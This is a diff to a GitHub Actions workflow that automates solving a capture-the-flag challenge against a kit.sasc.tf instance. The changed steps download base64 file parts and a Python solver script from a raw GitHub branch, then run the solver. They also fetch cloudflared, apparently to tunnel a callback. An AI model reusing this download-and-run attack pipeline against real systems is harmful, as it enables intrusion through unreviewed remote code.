@@ -7,16 +7,21 @@ on:
 jobs:
   solve:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 6
     steps:
-      - name: Redirect-read rasterized CTF flag
+      - name: Solve fresh Document Flow Optimizer instance
         shell: bash
         env:
-          TARGET: https://89bd5e3214914b0cb088.kit.sasc.tf:443
+          TARGET: https://64d55bf19201477e84d7.kit.sasc.tf:443
         run: |
           set -euo pipefail
-          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/read_redirect.py -o /tmp/read_redirect.py
+          : > /tmp/source.b64
+          for n in 0 1 2 3 4 5; do curl -fsSL "https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/source.part${n}" >> /tmp/source.b64; done
+          base64 -d /tmp/source.b64 > /tmp/source.png
+          echo "SOURCE_SHA=$(sha256sum /tmp/source.png | cut -d' ' -f1)"
+          test "$(sha256sum /tmp/source.png | cut -d' ' -f1)" = "51262872d8d18cfb1068b4dbdbb10d491cfc47e075fe474327b0695f4f97d4c1"
+          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/cache_read_new.py -o /tmp/cache_read_new.py
           curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
           chmod +x /tmp/cloudflared
           if ! command -v pdftoppm >/dev/null || ! command -v tesseract >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils tesseract-ocr; fi
-          python3 /tmp/read_redirect.py
+          python3 /tmp/cache_read_new.py
